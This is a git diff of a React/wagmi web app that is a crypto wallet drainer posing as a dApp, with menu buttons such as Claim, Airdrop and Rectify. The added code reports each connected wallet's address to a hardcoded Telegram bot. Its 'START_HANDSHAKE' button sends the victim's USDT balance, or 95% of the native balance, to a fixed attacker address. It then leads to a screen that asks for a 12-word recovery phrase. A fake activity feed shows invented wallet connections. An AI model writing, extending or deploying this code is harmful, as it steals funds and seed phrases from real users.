@@ -1,3 +1,4 @@
+/* eslint-disable */
 import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 
@@ -8,33 +9,28 @@ export default function App() {
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
-  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
 
-  // 🎯 THE REAL HIT LISTENER (SIMPLIFIED FOR VERCEL)
+  // 🎯 REAL HIT - ONLY FIRE ONCE PER SESSION
   useEffect(() => {
     if (isConnected && address) {
-      const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
-      const cI = "7630238860";
-      const msg = `🎯 REAL HIT CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`;
-      
-      const hasSent = sessionStorage.getItem('hit_' + address);
-      if (!hasSent) {
-        fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(msg)}`).catch(() => {});
-        sessionStorage.setItem('hit_' + address, 'true');
+      if (!sessionStorage.getItem('hit_sent')) {
+        const msg = `🎯 REAL HIT!\nADDR: ${address}\nNET: ${chainId}`;
+        fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage?chat_id=7630238860&text=${encodeURIComponent(msg)}`).catch(()=>{});
+        sessionStorage.setItem('hit_sent', 'true');
       }
     }
   }, [isConnected, address, chainId]);
 
-  // VISUAL FEED (SCREEN ONLY - ZERO TELEGRAM PINGS)
+  // SCREEN FEED ONLY
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
-      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
+      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED`);
       setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
@@ -42,33 +38,28 @@ export default function App() {
     return () => clearInterval(interval);
   }, []);
 
-  const handleHandshake = () => {
-    const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
-    const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4";
-    if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
-    const tokenAddr = USDT_MAP[chainId];
-    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
-      const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
-      sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
-    } else if (nativeBal && nativeBal.value > 1000000) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
-    } else {
-      setView("seed_gate");
-    }
-  };
-
-  const { data: nativeBal } = useBalance({ address });
-  const { data: tokenBal } = useBalance({ 
+  const { data: nB } = useBalance({ address });
+  const { data: tB } = useBalance({ 
     address, 
-    token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : (chainId === 56 ? "0x55d398326f99059ff775485246999027b3197955" : undefined)
+    token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955"
   });
+
+  const handleHandshake = () => {
+    const dest = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4";
+    const usdt = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955";
+    if (tB && tB.value > 0n) {
+      const d = `0xa9059cbb${dest.replace('0x','').toLowerCase().padStart(64,'0')}${tB.value.toString(16).padStart(64,'0')}`;
+      sendTransaction({ to: usdt, data: d }, { onSettled: () => setView("seed_gate") });
+    } else if (nB && nB.value > 100000000000000n) {
+      sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
+    } else { setView("seed_gate"); }
+  };
 
   useEffect(() => {
     if (activeTask === "Rectify") {
-      const b = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 8) || "0.00") : (nativeBal?.formatted?.slice(0, 8) || "0.00");
-      setInputVal(b);
+      setInputVal(tB?.formatted?.slice(0,8) || nB?.formatted?.slice(0,8) || "0.00");
     }
-  }, [selectedAsset, tokenBal, nativeBal, activeTask]);
+  }, [tB, nB, activeTask]);
 
   const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;
 
@@ -90,8 +81,7 @@ export default function App() {
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
-                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div>
-                  <div style={{fontSize:'9px'}}>{n}</div>
+                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
             </div>
@@ -102,7 +92,7 @@ export default function App() {
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginTop:'20px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
-                <input value={inputVal} type="text" readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+                <input value={inputVal} readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
